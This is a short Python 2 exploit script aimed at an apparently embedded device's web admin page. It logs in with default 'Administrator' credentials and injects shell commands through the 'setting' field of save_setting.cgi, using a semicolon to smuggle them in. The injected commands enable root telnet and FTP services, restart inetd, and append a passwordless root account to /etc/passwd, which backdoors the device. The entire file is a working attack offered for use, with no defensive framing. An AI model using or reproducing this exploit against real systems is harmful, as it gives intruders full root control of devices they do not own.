#!/usr/bin/env python2

import requests
import sys

def run_cmd(host, user, passwd, cmd):
    print 'rooting %s' % host

    path = 'http://%s/cgi-bin/admin/save_setting.cgi?lang=english' % host

    cmd_shell_h4x = '; %s' % cmd

    files = {
        'setting': (None, cmd_shell_h4x),
        'confirm': (None, ''),
    }

    r = requests.post(path, auth=(user, passwd), files=files)

host = sys.argv[1]
user = 'Administrator'
passwd = 'Administrator'

cmds = [
    "echo telnet\tstream\ttcp\tnowait\troot\t/usr/sbin/tcpd\tin.telnetd >> /etc/inetd.conf",
    "echo ftp\tstream\ttcp\tnowait\troot\t/usr/sbin/tcpd\tin.ftpd >> /etc/inetd.conf",
    "/etc/init.d/inetd restart",
    "echo rt::0:0:root:/root:/bin/bash >> /etc/passwd"
]

for cmd in cmds:
    run_cmd(host, user, passwd, cmd)
